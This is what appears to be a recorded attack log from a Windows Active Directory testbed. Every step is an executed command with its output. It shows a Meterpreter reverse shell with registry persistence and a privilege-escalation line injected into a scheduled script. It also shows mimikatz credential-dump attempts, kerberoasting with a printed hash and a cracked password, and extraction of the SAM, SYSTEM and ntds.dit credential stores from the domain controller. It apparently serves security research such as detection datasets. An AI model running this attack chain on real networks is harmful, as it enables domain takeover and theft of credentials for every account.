@@ -1,0 +1,803 @@
+--- 2025-10-10 12:52:26 INFO: ---
+
+Command: evil-winrm -i 10.10.10.10 -u Alice -p 'Pa$$w0rd'
+
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:52:38 INFO: ---
+
+Command: type C:\Scripts\Logger.ps1
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> type C:\Scripts\Logger.ps1
+[1G$logFile = "C:\Scripts\userlog.log"
+$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+$users = quser | Out-String
+"$time`n$users`n---`n" | Out-File -FilePath $logFile -Append
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:52:50 INFO: ---
+
+Command: type C:\Scripts\userlog.log -Tail 15
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> type C:\Scripts\userlog.log -Tail 15
+[1G
+---
+
+2025-10-10 12:50:01
+
+---
+
+2025-10-10 12:51:01
+
+---
+
+2025-10-10 12:52:01
+
+---
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:53:02 INFO: ---
+
+Command: schtasks /query
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> schtasks /query
+[1G
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft\OneCore
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft\Windows
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Server Initial Configuration Task        N/A                    Disabled
+
+Folder: \Microsoft\Windows\.NET Framework
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+.NET Framework NGEN v4.0.30319           N/A                    Ready
+.NET Framework NGEN v4.0.30319 64        N/A                    Ready
+.NET Framework NGEN v4.0.30319 64 Critic N/A                    Disabled
+.NET Framework NGEN v4.0.30319 Critical  N/A                    Disabled
+
+Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+AD RMS Rights Policy Template Management N/A                    Disabled
+AD RMS Rights Policy Template Management N/A                    Ready
+
+Folder: \Microsoft\Windows\AppID
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+PolicyConverter                          N/A                    Disabled
+VerifiedPublisherCertStoreCheck          N/A                    Disabled
+
+Folder: \Microsoft\Windows\Application Experience
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Microsoft Compatibility Appraiser        10/11/2025 4:55:48 AM  Ready
+PcaPatchDbTask                           10/10/2025 3:01:32 PM  Ready
+ProgramDataUpdater                       N/A                    Ready
+StartupAppTask                           N/A                    Ready
+
+Folder: \Microsoft\Windows\ApplicationData
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+appuriverifierdaily                      N/A                    Ready
+appuriverifierinstall                    N/A                    Ready
+CleanupTemporaryState                    N/A                    Ready
+DsSvcCleanup                             N/A                    Ready
+
+Folder: \Microsoft\Windows\AppxDeploymentClient
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Pre-staged app cleanup                   N/A                    Disabled
+
+Folder: \Microsoft\Windows\Autochk
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Proxy                                    N/A                    Ready
+
+Folder: \Microsoft\Windows\BitLocker
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+BitLocker Encrypt All Drives             N/A                    Ready
+BitLocker MDM policy Refresh             N/A                    Ready
+
+Folder: \Microsoft\Windows\Bluetooth
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+UninstallDeviceTask                      N/A                    Disabled
+
+Folder: \Microsoft\Windows\BrokerInfrastructure
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+BgTaskRegistrationMaintenanceTask        N/A                    Ready
+
+Folder: \Microsoft\Windows\Chkdsk
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ProactiveScan                            N/A                    Ready
+SyspartRepair                            N/A                    Ready
+
+Folder: \Microsoft\Windows\CloudExperienceHost
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+CreateObjectTask                         N/A                    Ready
+
+Folder: \Microsoft\Windows\Customer Experience Improvement Program
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Consolidator                             10/10/2025 6:00:00 PM  Ready
+UsbCeip                                  N/A                    Ready
+
+Folder: \Microsoft\Windows\Data Integrity Scan
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Data Integrity Check And Scan            10/10/2025 11:41:04 PM Ready
+Data Integrity Scan                      N/A                    Ready
+Data Integrity Scan for Crash Recovery   N/A                    Ready
+
+Folder: \Microsoft\Windows\Defrag
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ScheduledDefrag                          N/A                    Ready
+
+Folder: \Microsoft\Windows\Device Information
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Device                                   10/11/2025 3:14:24 AM  Ready
+Device User                              N/A                    Ready
+
+Folder: \Microsoft\Windows\Diagnosis
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Scheduled                                N/A                    Ready
+
+Folder: \Microsoft\Windows\DirectX
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+DirectXDatabaseUpdater                   N/A                    Ready
+DXGIAdapterCache                         N/A                    Ready
+
+Folder: \Microsoft\Windows\DiskCleanup
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+SilentCleanup                            N/A                    Ready
+
+Folder: \Microsoft\Windows\DiskDiagnostic
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Microsoft-Windows-DiskDiagnosticDataColl N/A                    Ready
+Microsoft-Windows-DiskDiagnosticResolver N/A                    Disabled
+
+Folder: \Microsoft\Windows\DiskFootprint
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Diagnostics                              N/A                    Ready
+StorageSense                             N/A                    Ready
+
+Folder: \Microsoft\Windows\EDP
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+EDP App Launch Task                      N/A                    Ready
+EDP Auth Task                            N/A                    Ready
+EDP Inaccessible Credentials Task        N/A                    Ready
+StorageCardEncryption Task               N/A                    Ready
+
+Folder: \Microsoft\Windows\ExploitGuard
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ExploitGuard MDM policy Refresh          N/A                    Ready
+
+Folder: \Microsoft\Windows\File Classification Infrastructure
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Property Definition Sync                 N/A                    Disabled
+
+Folder: \Microsoft\Windows\Flighting
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+INFO: There are no scheduled tasks presently available at your access level.
+
+Folder: \Microsoft\Windows\Flighting\FeatureConfig
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ReconcileFeatures                        N/A                    Ready
+UsageDataFlushing                        N/A                    Ready
+UsageDataReporting                       N/A                    Ready
+
+Folder: \Microsoft\Windows\Flighting\OneSettings
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+RefreshCache                             10/10/2025 7:45:32 PM  Ready
+
+Folder: \Microsoft\Windows\Input
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+LocalUserSyncDataAvailable               N/A                    Ready
+MouseSyncDataAvailable                   N/A                    Ready
+PenSyncDataAvailable                     N/A                    Ready
+TouchpadSyncDataAvailable                N/A                    Ready
+
+Folder: \Microsoft\Windows\InstallService
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ScanForUpdates                           N/A                    Disabled
+ScanForUpdatesAsUser                     N/A                    Disabled
+WakeUpAndContinueUpdates                 N/A                    Disabled
+WakeUpAndScanForUpdates                  N/A                    Disabled
+
+Folder: \Microsoft\Windows\Location
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Notifications                            N/A                    Ready
+WindowsActionDialog                      N/A                    Ready
+
+Folder: \Microsoft\Windows\Maintenance
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+WinSAT                                   N/A                    Ready
+
+Folder: \Microsoft\Windows\Maps
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+MapsToastTask                            N/A                    Disabled
+MapsUpdateTask                           N/A                    Disabled
+
+Folder: \Microsoft\Windows\MemoryDiagnostic
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ProcessMemoryDiagnosticEvents            N/A                    Disabled
+RunFullMemoryDiagnostic                  N/A                    Disabled
+
+Folder: \Microsoft\Windows\MUI
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+LPRemove                                 N/A                    Ready
+
+Folder: \Microsoft\Windows\Multimedia
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+SystemSoundsService                      N/A                    Disabled
+
+Folder: \Microsoft\Windows\NetTrace
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+GatherNetworkInfo                        N/A                    Ready
+
+Folder: \Microsoft\Windows\Offline Files
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Background Synchronization               N/A                    Disabled
+Logon Synchronization                    N/A                    Disabled
+
+Folder: \Microsoft\Windows\PLA
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Server Manager Performance Monitor       N/A                    Disabled
+
+Folder: \Microsoft\Windows\Plug and Play
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Device Install Group Policy              N/A                    Ready
+Device Install Reboot Required           N/A                    Ready
+Sysprep Generalize Drivers               N/A                    Ready
+
+Folder: \Microsoft\Windows\Power Efficiency Diagnostics
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+AnalyzeSystem                            N/A                    Ready
+
+Folder: \Microsoft\Windows\RecoveryEnvironment
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+VerifyWinRE                              N/A                    Ready
+
+Folder: \Microsoft\Windows\Server Manager
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+CleanupOldPerfLogs                       N/A                    Ready
+ServerManager                            N/A                    Ready
+
+Folder: \Microsoft\Windows\Servicing
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+StartComponentCleanup                    N/A                    Ready
+
+Folder: \Microsoft\Windows\SharedPC
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Account Cleanup                          N/A                    Disabled
+
+Folder: \Microsoft\Windows\Shell
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+CreateObjectTask                         N/A                    Ready
+IndexerAutomaticMaintenance              N/A                    Ready
+
+Folder: \Microsoft\Windows\Software Inventory Logging
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Collection                               N/A                    Disabled
+Configuration                            N/A                    Ready
+
+Folder: \Microsoft\Windows\SpacePort
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+SpaceAgentTask                           N/A                    Ready
+SpaceManagerTask                         N/A                    Ready
+
+Folder: \Microsoft\Windows\Speech
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+SpeechModelDownloadTask                  10/11/2025 12:54:02 AM Ready
+
+Folder: \Microsoft\Windows\StateRepository
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+MaintenanceTasks                         N/A                    Ready
+
+Folder: \Microsoft\Windows\Storage Tiers Management
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Storage Tiers Management Initialization  N/A                    Ready
+Storage Tiers Optimization               N/A                    Disabled
+
+Folder: \Microsoft\Windows\TextServicesFramework
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+MsCtfMonitor                             N/A                    Ready
+
+Folder: \Microsoft\Windows\Time Synchronization
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+ForceSynchronizeTime                     N/A                    Ready
+SynchronizeTime                          N/A                    Ready
+
+Folder: \Microsoft\Windows\Time Zone
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+SynchronizeTimeZone                      N/A                    Ready
+
+Folder: \Microsoft\Windows\UPnP
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+UPnPHostConfig                           N/A                    Disabled
+
+Folder: \Microsoft\Windows\Windows Error Reporting
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+QueueReporting                           10/10/2025 2:25:12 PM  Ready
+
+Folder: \Microsoft\Windows\Windows Filtering Platform
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+BfeOnServiceStartTypeChange              N/A                    Ready
+
+Folder: \Microsoft\Windows\Windows Media Sharing
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+UpdateLibrary                            N/A                    Ready
+
+Folder: \Microsoft\Windows\WindowsColorSystem
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Calibration Loader                       N/A                    Ready
+
+Folder: \Microsoft\Windows\WindowsUpdate
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Scheduled Start                          10/10/2025 2:11:17 PM  Ready
+
+Folder: \Microsoft\Windows\Wininet
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+CacheTask                                N/A                    Ready
+
+Folder: \Microsoft\Windows\Workplace Join
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+Automatic-Device-Join                    N/A                    Ready
+Device-Sync                              N/A                    Disabled
+Recovery-Check                           N/A                    Disabled
+
+Folder: \Microsoft\Windows\WwanSvc
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+OobeDiscovery                            N/A                    Ready
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:53:15 INFO: ---
+
+Command: Add-Content -Path "C:\Scripts\Logger.ps1" -Value "net localgroup administrators alice /add"
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> Add-Content -Path "C:\Scripts\Logger.ps1" -Value "net localgroup administrators alice /add"
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:54:15 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2025-10-10 12:54:17 INFO: ---
+
+Command: windows/x64/meterpreter/reverse_tcp
+Payload saved to /home/superuser/payloads/msfshell.exe
+--- 2025-10-10 12:54:37 INFO: ---
+
+Command: upload /home/superuser/payloads/msfshell.exe C:\\Users\\Public\\msfshell.exe
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> upload /home/superuser/payloads/msfshell.exe C:\\Users\\Public\\msfshell.exe
+[1G                                        
+[0;34mInfo: Uploading /home/superuser/payloads/msfshell.exe to C:\Users\Public\msfshell.exe[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;35mData: 9556 bytes of 9556 bytes copied[0m
+                                        
+[0;34mInfo: Upload successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:54:49 INFO: ---
+
+Command: New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Persistence" -Value "C:\Users\Public\msfshell.exe" -PropertyType "String" -Force
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Persistence" -Value "C:\Users\Public\msfshell.exe" -PropertyType "String" -Force
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:55:01 INFO: ---
+
+Command: C:\Users\Public\msfshell.exe
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> C:\Users\Public\msfshell.exe
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:57:09 INFO: ---
+
+Command: getuid
+Server username: AECID-TESTBED\alice
+
+--- 2025-10-10 12:57:13 INFO: ---
+
+Command: getsystem
+[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+
+--- 2025-10-10 12:57:16 INFO: ---
+
+Command: getuid
+Server username: AECID-TESTBED\alice
+
+--- 2025-10-10 12:57:19 INFO: ---
+
+Command: pgrep lsass
+684
+
+--- 2025-10-10 12:57:19 INFO: ---
+
+Command: 684
+
+
+--- 2025-10-10 12:57:22 INFO: ---
+
+Command: migrate 684
+
+[*] Migrating from 7080 to 684...
+[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
+
+--- 2025-10-10 12:57:32 INFO: ---
+
+Command: sleep
+Awake O_O
+--- 2025-10-10 12:57:35 INFO: ---
+
+Command: getpid
+Current pid: 7080
+
+--- 2025-10-10 12:57:38 INFO: ---
+
+Command: load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+--- 2025-10-10 12:57:42 INFO: ---
+
+Command: kiwi_cmd "privilege::debug"
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+
+
+--- 2025-10-10 12:57:45 INFO: ---
+
+Command: kiwi_cmd "sekurlsa::logonpasswords"
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
+--- 2025-10-10 12:57:48 INFO: ---
+
+Command: kiwi_cmd "lsadump::cache"
+Domain : WEB
+SysKey : af1d38759c4c41b122c5c9ea4239eefb
+ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)
+
+
+--- 2025-10-10 12:57:52 INFO: ---
+
+Command: kiwi_cmd "lsadump::sam"
+Domain : WEB
+SysKey : af1d38759c4c41b122c5c9ea4239eefb
+ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
+ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
+
+
+--- 2025-10-10 12:58:05 INFO: ---
+
+Command: upload /home/superuser/payloads/Rubeus.exe C:\\Users\\Public\\Rubeus.exe
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> upload /home/superuser/payloads/Rubeus.exe C:\\Users\\Public\\Rubeus.exe
+[1G                                        
+[0;34mInfo: Uploading /home/superuser/payloads/Rubeus.exe to C:\Users\Public\Rubeus.exe[0m
+Progress: 60% : |▓▓▓▓▓▒░░░░|          Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;35mData: 623956 bytes of 623956 bytes copied[0m
+                                        
+[0;34mInfo: Upload successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Alice\Documents> [0m[?25h[43G
+--- 2025-10-10 12:58:08 INFO: ---
+
+Command: execute -f C:\\Users\\Public\\Rubeus.exe -a "kerberoast /nowrap" -i
+Process 6344 created.
+Channel 1 created.
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : aecid-testbed.com
+[*] Searching path 'LDAP://dc1.aecid-testbed.com/DC=aecid-testbed,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : wsadmin
+[*] DistinguishedName      : CN=wsadmin,CN=Users,DC=aecid-testbed,DC=com
+[*] ServicePrincipalName   : wsadmin/dc1.aecid-testbed.com
+[*] PwdLastSet             : 10/10/2025 12:16:47 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*wsadmin$aecid-testbed.com$wsadmin/dc1.aecid-testbed.com@aecid-testbed.com*$A16B1D89763B69EB49F62DBE7AEE8837$0A95D9E27FF1E2095E293638CAFA0E5AAAF32ABA5FFC9ABFA2B91C51F094A34B3CB2D805F4C306CA0C5A1483212D6B5C370F600A3CE909D775C0A7733F5D8A18325087ABD61604BEB93F595C8CE3E5120CA1905FDE1366C745EF1B1BDE6D6F71BEFAC86F1DDEEF5697109E7AC2918A12ACE511AAB24DFB3CA9F6295B4E948AAF07087C32EDB6A7ECE9B82FD860A06C066E0E5A7AE32DFDDAECA225E5C22D6B19EFBDD2C9920C64C7BCC66922AF55B2444C92286AAAE3896DD2F60F06F6550C70FE1A2E9187F4F6A86FFD0FDE334D11E2F6F1E9EED8F13B749491F4F3FC8F85AB202F8F517F419568FFFB2DB8566BA9F94A44FA3C394CDC0AE149B1DF17E28B3EB62002EAA35FCFB6C22D63DB88848E4FC8905D41413677D02F3600AF0A07696C3725E4CD546633E7FFE31C7DB4D6487821FB2A22827B4215C5EB3EC21C4E6BEB168D1CC156BCF280CC5C2FEF876DF18297E72CFF8BDB4634F8BC014FFBA8A02CDA380A8D4862C5CFF0DB77512AB80CC930B17638779AA647E52BDA795934590712A309AB293DE2CE9529E944ADEDD7D81A47C451A484170641B7BCC9B62EF7479CC03676C259E06BB1DE43953D249406C3E616CD5852D5CA2AE1370CE8253B89DC12A08C6D4F72CACC2A3E0D920C162612780640AB93085B6AD77646C9573F940B41A80DFC0130543A9E78D8153B7C8C4AC4057DDF049036059EA090CA996ED6341EDFB28E5D55A9BA93C80AA8F11D6E9C2F3347C456514D30F5125F09DFFC857B26D29A37EF6B32BD4B6E0CC7419157B65EE3A459D6034FCB388B6539A89E7D60C0AF6B64325FED1EE4E2CD35B7DE5E530691D669EB0EE63873FEA8C0F541BED028F6D65EC91AEEBD0DE465CD0106AF456A66212477897B7B619B0E35E7CBAA05A9F8753794F254B63620A80C7C108F8AE09A8B0FC5713F9081CAF9E0B0B827F8EC62069F1841116A46DDB7090877087D2F64B9DB88BD960F3AFECC1D1958D828F1A1A985FE332E6926A3E7FF5CDAB2D16AF207C09692049A3E1146CC102056AF9F1AF9C02886ED405B9DE48AF3216AF4239C5908D9DBCE0AFA7A8AFE6BFFCEB9C8D50F6EC13F042A73EBCA5F111575F5708880ED5DE2C44E95152B055F78614FBC7FADCE597793DD51F504CC80F84DD32101FF0D4CB22C735300D0392C98538D51869A2DD4DBD7F4584733EDC52AE19013F7B595A199A5BDB27E7E68CD77C328AD030A00B77AC97D64C4F512617B1B71F3CB6AC1B51DBA9C2C793DD9C4A070F253C95D561EBD36759628F3BCF4641EA08F151F98E80DA959F56517CE9724828EF756E3982EF92B8E215E3F0B7D6C4DB7368F15EABB5A5332548201C26F65136820C893788E927EB7D83A0EB6C204305F3A63BA9D953D83D64291543FF0EF0E1C37479DB9E5D8943A666B6BD70183CDB8AEEFEDCBEACF69C3AE58BAFEF93D5544804DF75526477A4467565B51ECF15D50B1171FA97EA728C2C1CA1F073D05299CAB90EC97BBE9FC500AA9E74362BE159C0DDA659990CFE0DCA942A2FF627B5FA35C0EE969866E0088CD1B99D2FD8AA24222687D5BD5FF016EB0DD38E9412CEE4A0C52C186D67344B0
+
+
+--- 2025-10-10 12:58:08 INFO: ---
+
+Command: Cracking the hash of wsadmin obtained through kerberoasting offline ...
+Debug: 'Cracking the hash of wsadmin obtained through kerberoasting offline ...'
+--- 2025-10-10 12:58:41 INFO: ---
+
+Command: evil-winrm -i 10.10.10.10 -u wsadmin -p 'Root.PW1'
+
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 12:58:54 INFO: ---
+
+Command: upload /home/superuser/payloads/SharpGPOAbuse.exe C:\\Users\\Public\\SharpGPOAbuse.exe
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> upload /home/superuser/payloads/SharpGPOAbuse.exe C:\\Users\\Public\\SharpGPOAbuse.exe
+[1G                                        
+[0;34mInfo: Uploading /home/superuser/payloads/SharpGPOAbuse.exe to C:\Users\Public\SharpGPOAbuse.exe[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;35mData: 94888 bytes of 94888 bytes copied[0m
+                                        
+[0;34mInfo: Upload successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 12:59:08 INFO: ---
+
+Command: $Username = "wsadmin"; $Password = "Root.PW1"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $Credential;
+
+[?25l[1G[K[?25h[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> $Username = "wsadmin"; $Password = "Root.PW1"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $Credential;
+[1G[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [?25l[1G[K[1G[0m[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\wsadmin\Documents> [0m[?25h[45G
+--- 2025-10-10 12:59:44 INFO: ---
+
+Command: Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { reg.exe save HKLM\SYSTEM C:\Users\Public\SYSTEM.hive /y; reg.exe save HKLM\SAM C:\Users\Public\SAM.hive /y; vssadmin CREATE SHADOW /For=C:; $ShadowCopyVolume = (vssadmin list shadows | Select-String "Shadow Copy Volume:" | Select-Object -First 1).ToString().Split(":")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\Windows\NTDS\ntds.dit c:\Users\Public\ntds.dit; vssadmin delete shadows /All /Quiet }
+
